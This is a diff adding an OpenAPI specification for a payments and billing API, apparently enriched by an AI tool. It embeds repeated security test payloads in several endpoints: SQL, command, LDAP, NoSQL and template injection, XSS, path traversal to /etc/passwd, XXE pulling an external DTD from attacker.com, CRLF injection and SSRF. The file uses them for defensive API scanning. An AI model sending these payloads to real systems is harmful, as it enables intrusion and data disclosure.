+              "payload": {
+                "name": "<script>alert('XSS')</script>"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xss attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xss_3",
+              "category": "xss",
+              "description": "Event-based XSS",
+              "payload": {
+                "name": "<img src=x onerror=alert('XSS')>"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xss attack",
+              "source": "static_template"
+            },
+            {
+              "name": "command_injection_4",
+              "category": "command_injection",
+              "description": "Command separator - list files",
+              "payload": {
+                "filename": "; ls -la"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject command injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "command_injection_5",
+              "category": "command_injection",
+              "description": "Pipe operator - get current user",
+              "payload": {
+                "filename": "| whoami"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject command injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "path_traversal_6",
+              "category": "path_traversal",
+              "description": "Basic path traversal - Unix",
+              "payload": {
+                "file": "../../../etc/passwd"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject path traversal attack",
+              "source": "static_template"
+            },
+            {
+              "name": "path_traversal_7",
+              "category": "path_traversal",
+              "description": "Basic path traversal - Windows",
+              "payload": {
+                "file": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject path traversal attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xxe_8",
+              "category": "xxe",
+              "description": "Basic XXE - file disclosure",
+              "payload": {
+                "xml": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<foo>&xxe;</foo>"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xxe attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xxe_9",
+              "category": "xxe",
+              "description": "XXE - external DTD",
+              "payload": {
+                "xml": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"http://attacker.com/evil.dtd\" >]>\n<foo>&xxe;</foo>"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xxe attack",
+              "source": "static_template"
+            },
+            {
+              "name": "nosql_injection_10",
+              "category": "nosql_injection",
+              "description": "MongoDB - not equal (authentication bypass)",
+              "payload": {
+                "$ne": null
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject nosql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "nosql_injection_11",
+              "category": "nosql_injection",
+              "description": "MongoDB - greater than (bypass)",
+              "payload": {
+                "$gt": ""
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject nosql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ldap_injection_12",
+              "category": "ldap_injection",
+              "description": "LDAP wildcard - match all",
+              "payload": {
+                "username": "*"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ldap injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ldap_injection_13",
+              "category": "ldap_injection",
+              "description": "LDAP filter bypass",
+              "payload": {
+                "username": "admin)(&)"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ldap injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "header_injection_14",
+              "category": "header_injection",
+              "description": "CRLF injection - cookie manipulation",
+              "payload": {
+                "redirect_url": "test\r\nSet-Cookie: admin=true"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject header injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "header_injection_15",
+              "category": "header_injection",
+              "description": "CRLF injection - redirect",
+              "payload": {
+                "redirect_url": "test\r\nLocation: http://attacker.com"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject header injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ssrf_16",
+              "category": "ssrf",
+              "description": "SSRF - localhost access",
+              "payload": {
+                "url": "http://localhost/admin"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ssrf attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ssrf_17",
+              "category": "ssrf",
+              "description": "SSRF - loopback access",
+              "payload": {
+                "url": "http://127.0.0.1/admin"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ssrf attack",
+              "source": "static_template"
+            },
+            {
+              "name": "template_injection_18",
+              "category": "template_injection",
+              "description": "Jinja2 - basic math test",
+              "payload": {
+                "template": "{{7*7}}"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject template injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "template_injection_19",
+              "category": "template_injection",
+              "description": "Jinja2 - config disclosure",
+              "payload": {
+                "template": "{{config.items()}}"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject template injection attack",
+              "source": "static_template"
+            }
+          ],
+          "logic_fuzz": [
+            {
+              "name": "limit_below_minimum",
+              "category": "logic_fuzz",
+              "description": "'limit' below minimum allowed value (ge=1.0)",
+              "payload": {
+                "limit": 0.99
+              },
+              "confidence": 0.7,
+              "confidence_signals": [
+                "type_hint_only",
+                "annotated_constraint",
+                "docstring_constraint"
+              ],
+              "fp_risk": "low",
+              "expected_status": [
+                400,
+                422
+              ],
+              "violation_type": "range_violation",
+              "source": "logic_fuzz_deterministic"
+            },
+            {
+              "name": "limit_above_maximum",
+              "category": "logic_fuzz",
+              "description": "'limit' above maximum allowed value (le=200.0)",
+              "payload": {
+                "limit": 200.01
+              },
+              "confidence": 0.7,
+              "confidence_signals": [
+                "type_hint_only",
+                "annotated_constraint",
+                "docstring_constraint"
+              ],
+              "fp_risk": "low",
+              "expected_status": [
+                400,
+                422
+              ],
+              "violation_type": "range_violation",
+              "source": "logic_fuzz_deterministic"
+            },
+            {
+              "name": "limit_float_for_integer",
+              "category": "logic_fuzz",
+              "description": "Float value for integer field 'limit'",
+              "payload": {
+                "limit": 1.5
+              },
+              "confidence": 0.7,
+              "confidence_signals": [
+                "type_hint_only",
+                "annotated_constraint",
+                "docstring_constraint"
+              ],
+              "fp_risk": "low",
+              "expected_status": [
+                400,
+                422
+              ],
+              "violation_type": "type_coercion",
+              "source": "logic_fuzz_deterministic"
+            },
+            {
+              "name": "limit_string_for_integer",
+              "category": "logic_fuzz",
+              "description": "String value for integer field 'limit'",
+              "payload": {
+                "limit": "not_a_number"
+              },
+              "confidence": 0.7,
+              "confidence_signals": [
+                "type_hint_only",
+                "annotated_constraint",
+                "docstring_constraint"
+              ],
+              "fp_risk": "low",
+              "expected_status": [
+                400,
+                422
+              ],
+              "violation_type": "type_coercion",
+              "source": "logic_fuzz_deterministic"
+            }
+          ]
+        }
+      },
+      "any": {
+        "summary": "Create refund",
+        "responses": {
+          "201": {
+            "description": "Refund created"
+          },
+          "403": {
+            "description": "Access denied"
+          },
+          "409": {
+            "description": "Transaction not completed"
+          },
+          "422": {
+            "description": "Refund amount exceeds balance"
+          }
+        },
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "schema": {
+                "type": "object",
+                "properties": {
+                  "transaction_id": {
+                    "type": "string"
+                  },
+                  "amount": {
+                    "type": "number"
+                  }
+                },
+                "required": [
+                  "transaction_id"
+                ]
+              }
+            }
+          }
+        },
+        "security": [
+          {
+            "bearerAuth": []
+          }
+        ],
+        "description": "Create a refund for a transaction."
+      }
+    },
+    "/api/v1/refunds/{refund_id}": {
+      "get": {
+        "summary": "Request refund",
+        "responses": {
+          "200": {
+            "description": "Success"
+          },
+          "409": {
+            "description": "Conflict"
+          },
+          "422": {
+            "description": "Unprocessable entity"
+          }
+        },
+        "parameters": [
+          {
+            "name": "refund_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "requestBody": {
+          "content": {
+            "application/json": {
+              "schema": {
+                "type": "object",
+                "properties": {
+                  "transaction_id": {
+                    "type": "string"
+                  },
+                  "amount": {
+                    "type": "number"
+                  }
+                }
+              }
+            }
+          },
+          "required": true
+        },
+        "description": "Request a refund for a transaction."
+      },
+      "any": {
+        "summary": "Get refund",
+        "responses": {
+          "200": {
+            "description": "Refund details"
+          },
+          "403": {
+            "description": "Access denied"
+          },
+          "404": {
+            "description": "Refund not found"
+          }
+        },
+        "parameters": [
+          {
+            "name": "refund_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "security": [
+          {
+            "bearerAuth": []
+          }
+        ],
+        "description": "Get details of a refund."
+      }
+    },
+    "/api/v1/subscriptions": {
+      "get": {
+        "summary": "List subscriptions",
+        "responses": {
+          "200": {
+            "description": "Success"
+          }
+        },
+        "security": [
+          {
+            "bearerAuth": []
+          }
+        ],
+        "description": "List subscriptions for authenticated user."
+      },
+      "post": {
+        "summary": "List subscriptions",
+        "responses": {
+          "403": {
+            "description": "Access denied"
+          }
+        },
+        "parameters": [
+          {
+            "name": "customer_id",
+            "in": "query",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "security": [
+          {
+            "get_current_user": []
+          }
+        ],
+        "description": "List customer subscriptions. IDOR protection: customer_id must match user."
+      },
+      "any": {
+        "summary": "Create subscription",
+        "responses": {
+          "201": {
+            "description": "Subscription created"
+          },
+          "403": {
+            "description": "Access denied"
+          }
+        },
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "schema": {
+                "type": "object",
+                "properties": {
+                  "customer_id": {
+                    "type": "string"
+                  },
+                  "plan_id": {
+                    "type": "string"
+                  },
+                  "billing_interval": {
+                    "type": "string"
+                  },
+                  "amount": {
+                    "type": "number"
+                  },
+                  "discount_percent": {
+                    "type": "integer"
+                  },
+                  "trial_days": {
+                    "type": "integer"
+                  },
+                  "max_retry_attempts": {
+                    "type": "integer"
+                  }
+                },
+                "required": [
+                  "customer_id",
+                  "plan_id",
+                  "billing_interval",
+                  "amount"
+                ]
+              }
+            }
+          }
+        },
+        "security": [
+          {
+            "bearerAuth": []
+          }
+        ],
+        "description": "Create a new subscription."
+      }
+    },
+    "/webhooks/paypal": {
+      "post": {
+        "summary": "PayPal webhook",
+        "responses": {
+          "200": {
+            "description": "Webhook received"
+          }
+        },
+        "description": "Handle PayPal payment webhooks.",
+        "x-test-payloads": {
+          "valid": [
+            {},
+            {
+              "amount": 2499,
+              "currency": "eur",
+              "payer": {
+                "email_address": "customer@company.com"
+              },
+              "transactions": [
+                {
+                  "invoice_id": "INV0012345"
+                }
+              ]
+            }
+          ],
+          "edge_cases": [
+            {
+              "amount": 0,
+              "currency": "eur",
+              "payer": {
+                "email_address": "customer@company.com"
+              },
+              "transactions": []
+            },
+            {
+              "amount": 999999999,
+              "currency": "EUR in all caps",
+              "payer": {
+                "email_address": "\"customer@company.com\""
+              },
+              "transactions": [
+                {
+                  "invoice_id": "INV0012345"
+                }
+              ]
+            },
+            {
+              "amount": 1000,
+              "currency": "eur",
+              "payer": {
+                "email_address": "customer@company.com"
+              },
+              "transactions": [
+                {
+                  "invoice_id": "INV0012345"
+                },
+                {
+                  "invoice_id": "INV0012346"
+                }
+              ]
+            }
+          ],
+          "fuzz": [
+            {
+              "amount": "invalid",
+              "currency": null,
+              "payer": [],
+              "transactions": {}
+            },
+            {
+              "amount": 1000,
+              "currency": "eur",
+              "payer": {
+                "email_address": "invalid@company.com"
+              },
+              "transactions": [
+                {
+                  "invoice_id": 12345
+                }
+              ]
+            }
+          ],
+          "security": [
+            {
+              "name": "sql_injection_0",
+              "category": "sql_injection",
+              "description": "Classic SQL injection - authentication bypass",
+              "payload": {
+                "username": "' OR '1'='1"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject sql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "sql_injection_1",
+              "category": "sql_injection",
+              "description": "Comment-based bypass",
+              "payload": {
+                "username": "admin' --"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject sql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xss_2",
+              "category": "xss",
+              "description": "Basic reflected XSS",
+              "payload": {
+                "name": "<script>alert('XSS')</script>"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xss attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xss_3",
+              "category": "xss",
+              "description": "Event-based XSS",
+              "payload": {
+                "name": "<img src=x onerror=alert('XSS')>"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xss attack",
+              "source": "static_template"
+            },
+            {
+              "name": "command_injection_4",
+              "category": "command_injection",
+              "description": "Command separator - list files",
+              "payload": {
+                "filename": "; ls -la"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject command injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "command_injection_5",
+              "category": "command_injection",
+              "description": "Pipe operator - get current user",
+              "payload": {
+                "filename": "| whoami"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject command injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "path_traversal_6",
+              "category": "path_traversal",
+              "description": "Basic path traversal - Unix",
+              "payload": {
+                "file": "../../../etc/passwd"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject path traversal attack",
+              "source": "static_template"
+            },
+            {
+              "name": "path_traversal_7",
+              "category": "path_traversal",
+              "description": "Basic path traversal - Windows",
+              "payload": {
+                "file": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject path traversal attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xxe_8",
+              "category": "xxe",
+              "description": "Basic XXE - file disclosure",
+              "payload": {
+                "xml": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<foo>&xxe;</foo>"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xxe attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xxe_9",
+              "category": "xxe",
+              "description": "XXE - external DTD",
+              "payload": {
+                "xml": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"http://attacker.com/evil.dtd\" >]>\n<foo>&xxe;</foo>"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xxe attack",
+              "source": "static_template"
+            },
+            {
+              "name": "nosql_injection_10",
+              "category": "nosql_injection",
+              "description": "MongoDB - not equal (authentication bypass)",
+              "payload": {
+                "$ne": null
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject nosql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "nosql_injection_11",
+              "category": "nosql_injection",
+              "description": "MongoDB - greater than (bypass)",
+              "payload": {
+                "$gt": ""
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject nosql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ldap_injection_12",
+              "category": "ldap_injection",
+              "description": "LDAP wildcard - match all",
+              "payload": {
+                "username": "*"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ldap injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ldap_injection_13",
+              "category": "ldap_injection",
+              "description": "LDAP filter bypass",
+              "payload": {
+                "username": "admin)(&)"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ldap injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "header_injection_14",
+              "category": "header_injection",
+              "description": "CRLF injection - cookie manipulation",
+              "payload": {
+                "redirect_url": "test\r\nSet-Cookie: admin=true"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject header injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "header_injection_15",
+              "category": "header_injection",
+              "description": "CRLF injection - redirect",
+              "payload": {
+                "redirect_url": "test\r\nLocation: http://attacker.com"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject header injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ssrf_16",
+              "category": "ssrf",
+              "description": "SSRF - localhost access",
+              "payload": {
+                "url": "http://localhost/admin"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ssrf attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ssrf_17",
+              "category": "ssrf",
+              "description": "SSRF - loopback access",
+              "payload": {
+                "url": "http://127.0.0.1/admin"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ssrf attack",
+              "source": "static_template"
+            },
+            {
+              "name": "template_injection_18",
+              "category": "template_injection",
+              "description": "Jinja2 - basic math test",
+              "payload": {
+                "template": "{{7*7}}"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject template injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "template_injection_19",
+              "category": "template_injection",
+              "description": "Jinja2 - config disclosure",
+              "payload": {
+                "template": "{{config.items()}}"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject template injection attack",
+              "source": "static_template"
+            }
+          ],
+          "logic_fuzz": []
+        }
+      }
+    },
+    "/webhooks/stripe": {
+      "post": {
+        "summary": "Stripe webhook",
+        "responses": {
+          "200": {
+            "description": "Webhook received"
+          }
+        },
+        "description": "Handle Stripe payment webhooks.",
+        "x-test-payloads": {
+          "valid": [
+            {},
+            {
+              "amount": 1999,
+              "currency": "usd",
+              "customer": {
+                "email": "user@example.com"
+              },
+              "metadata": {
+                "order_id": 123
+              }
+            }
+          ],
+          "edge_cases": [
+            {
+              "amount": 0,
+              "currency": "usd",
+              "customer": {
+                "email": "user@example.com"
+              },
+              "metadata": {
+                "order_id": -1
+              }
+            },
+            {
+              "amount": 999999999,
+              "currency": "USD in all caps",
+              "customer": {
+                "email": "\"user@example.com\""
+              },
+              "metadata": {
+                "order_id": 9223372036854775807
+              }
+            },
+            {
+              "amount": 1000,
+              "currency": "usd",
+              "customer": {
+                "email": "user@example.com"
+              },
+              "metadata": {
+                "order_id": "123"
+              }
+            }
+          ],
+          "fuzz": [
+            {
+              "amount": "invalid",
+              "currency": null,
+              "customer": [],
+              "metadata": {}
+            },
+            {
+              "amount": 1000,
+              "currency": "usd",
+              "customer": {
+                "email": "invalid\nexample.com"
+              },
+              "metadata": {
+                "order_id": "abc"
+              }
+            }
+          ],
+          "security": [
+            {
+              "name": "sql_injection_0",
+              "category": "sql_injection",
+              "description": "Classic SQL injection - authentication bypass",
+              "payload": {
+                "username": "' OR '1'='1"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject sql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "sql_injection_1",
+              "category": "sql_injection",
+              "description": "Comment-based bypass",
+              "payload": {
+                "username": "admin' --"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject sql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xss_2",
+              "category": "xss",
+              "description": "Basic reflected XSS",
+              "payload": {
+                "name": "<script>alert('XSS')</script>"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xss attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xss_3",
+              "category": "xss",
+              "description": "Event-based XSS",
+              "payload": {
+                "name": "<img src=x onerror=alert('XSS')>"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xss attack",
+              "source": "static_template"
+            },
+            {
+              "name": "command_injection_4",
+              "category": "command_injection",
+              "description": "Command separator - list files",
+              "payload": {
+                "filename": "; ls -la"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject command injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "command_injection_5",
+              "category": "command_injection",
+              "description": "Pipe operator - get current user",
+              "payload": {
+                "filename": "| whoami"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject command injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "path_traversal_6",
+              "category": "path_traversal",
+              "description": "Basic path traversal - Unix",
+              "payload": {
+                "file": "../../../etc/passwd"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject path traversal attack",
+              "source": "static_template"
+            },
+            {
+              "name": "path_traversal_7",
+              "category": "path_traversal",
+              "description": "Basic path traversal - Windows",
+              "payload": {
+                "file": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject path traversal attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xxe_8",
+              "category": "xxe",
+              "description": "Basic XXE - file disclosure",
+              "payload": {
+                "xml": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<foo>&xxe;</foo>"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xxe attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xxe_9",
+              "category": "xxe",
+              "description": "XXE - external DTD",
+              "payload": {
+                "xml": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"http://attacker.com/evil.dtd\" >]>\n<foo>&xxe;</foo>"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xxe attack",
+              "source": "static_template"
+            },
+            {
+              "name": "nosql_injection_10",
+              "category": "nosql_injection",
+              "description": "MongoDB - not equal (authentication bypass)",
+              "payload": {
+                "$ne": null
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject nosql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "nosql_injection_11",
+              "category": "nosql_injection",
+              "description": "MongoDB - greater than (bypass)",
+              "payload": {
+                "$gt": ""
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject nosql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ldap_injection_12",
+              "category": "ldap_injection",
+              "description": "LDAP wildcard - match all",
+              "payload": {
+                "username": "*"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ldap injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ldap_injection_13",
+              "category": "ldap_injection",
+              "description": "LDAP filter bypass",
+              "payload": {
+                "username": "admin)(&)"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ldap injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "header_injection_14",
+              "category": "header_injection",
+              "description": "CRLF injection - cookie manipulation",
+              "payload": {
+                "redirect_url": "test\r\nSet-Cookie: admin=true"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject header injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "header_injection_15",
+              "category": "header_injection",
+              "description": "CRLF injection - redirect",
+              "payload": {
+                "redirect_url": "test\r\nLocation: http://attacker.com"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject header injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ssrf_16",
+              "category": "ssrf",
+              "description": "SSRF - localhost access",
+              "payload": {
+                "url": "http://localhost/admin"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ssrf attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ssrf_17",
+              "category": "ssrf",
+              "description": "SSRF - loopback access",
+              "payload": {
+                "url": "http://127.0.0.1/admin"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ssrf attack",
+              "source": "static_template"
+            },
+            {
+              "name": "template_injection_18",
+              "category": "template_injection",
+              "description": "Jinja2 - basic math test",
+              "payload": {
+                "template": "{{7*7}}"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject template injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "template_injection_19",
+              "category": "template_injection",
+              "description": "Jinja2 - config disclosure",
+              "payload": {
+                "template": "{{config.items()}}"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject template injection attack",
+              "source": "static_template"
+            }
+          ],
+          "logic_fuzz": []
+        }
+      }
+    },
+    "Uvicorn ASGI": {
+      "any": {
+        "summary": "Uvicorn ASGI",
+        "responses": {
+          "200": {
+            "description": "Success"
+          }
+        },
+        "description": "Uvicorn ASGI server entry point."
+      }
+    },
+    "/health": {
+      "get": {
+        "summary": "Health check for probes",
+        "responses": {
+          "200": {
+            "description": "Success"
+          }
+        },
+        "description": "Health check endpoint for Kubernetes probes."
+      },
+      "any": {
+        "summary": "Readiness probe",
+        "responses": {
+          "200": {
+            "description": "Successful readiness check"
+          }
+        },
+        "description": "Kubernetes readiness probe."
+      }
+    },
+    "/health/live": {
+      "get": {
+        "summary": "Kubernetes liveness probe",
+        "responses": {
+          "200": {
+            "description": "Success"
+          }
+        },
+        "description": "Kubernetes liveness probe."
+      }
+    },
+    "/health/ready": {
+      "get": {
+        "summary": "Kubernetes readiness probe",
+        "responses": {
+          "200": {
+            "description": "Success"
+          }
+        },
+        "description": "Kubernetes readiness probe."
+      }
+    }
+  },
+  "components": {
+    "securitySchemes": {
+      "bearerAuth": {
+        "type": "http",
+        "scheme": "bearer",
+        "bearerFormat": "JWT"
+      }
+    }
+  },
+  "x-ai-enrichment": {
+    "enabled": true,
+    "agents": [
+      "openapi_enrichment",
+      "auth_flow_detector",
+      "payload_generator",
+      "dependency_graph",
+      "bola_detection"
+    ],
+    "model": "arn:aws:bedrock:us-east-1::foundation-model/anthropic.claude-3-sonnet-20240229-v1:0",
+    "stats": {
+      "total_endpoints": 74,
+      "enriched_endpoints": 74,
+      "failed_endpoints": 0,
+      "cache_hits": 0,
+      "cache_misses": 151,
+      "total_api_calls": 21,
+      "global_analyses": 3,
+      "deterministic_params": 27,
+      "deterministic_status_codes": 28,
+      "deterministic_type_hints": 0,
+      "deterministic_auth_decorators": 0,
+      "deterministic_docstrings": 0,
+      "skipped_endpoints": 0,
+      "elapsed_total": 237.26,
+      "elapsed_deterministic": 0.05,
+      "elapsed_global_analyses": 65.95,
+      "elapsed_endpoint_enrichments": 171.24,
+      "total_tokens_used": 89721,
+      "token_budget": 100000
+    },
+    "auth_config": {
+      "auth_mechanisms": [
+        {
+          "type": "jwt",
+          "confidence": 0.9,
+          "evidence": [
+            "Depends(get_current_user)",
+            "current_user: CurrentUser"
+          ],
+          "scheme_name": "bearerAuth",
+          "openapi_scheme": {
+            "type": "http",
+            "scheme": "bearer",
+            "bearerFormat": "JWT"
+          },
+          "invicti_config": {
+            "type": "bearer_token",
+            "header_name": "Authorization",
+            "token_prefix": "Bearer",
+            "token_endpoint": "/api/v1/auth/login",
+            "token_field": "access_token"
+          }
+        }
+      ],
+      "auth_endpoints": [
+        {
+          "endpoint": "/api/v1/auth/login",
+          "method": "POST",
+          "purpose": "authentication",
+          "request_fields": [
+            "username",
+            "password"
+          ],
+          "response_fields": [
+            "access_token"
+          ]
+        },
+        {
+          "endpoint": "/api/v1/auth/refresh",
+          "method": "POST",
+          "purpose": "token_refresh",
+          "request_fields": [
+            "refresh_token"
+          ],
+          "response_fields": [
+            "access_token"
+          ]
+        }
+      ],
+      "endpoint_security": {
+        "/api/v1/billing/invoices": {
+          "required": true,
+          "mechanisms": [
+            "bearerAuth"
+          ],
+          "authorization": {
+            "type": "role",
+            "required_roles": [
+              "user",
+              "admin"
+            ]
+          }
+        },
+        "/api/v1/billing/invoices/{invoice_id}": {
+          "required": true,
+          "mechanisms": [
+            "bearerAuth"
+          ],
+          "authorization": {
+            "type": "ownership",
+            "owner_field": "customer_id"
+          }
+        },
+        "/api/v1/billing/invoices/{invoice_id}/pay": {
+          "required": true,
+          "mechanisms": [
+            "bearerAuth"
+          ],
+          "authorization": {
+            "type": "ownership",
+            "owner_field": "customer_id"
+          }
+        },
+        "/api/v1/subscriptions/{subscription_id}": {
+          "required": true,
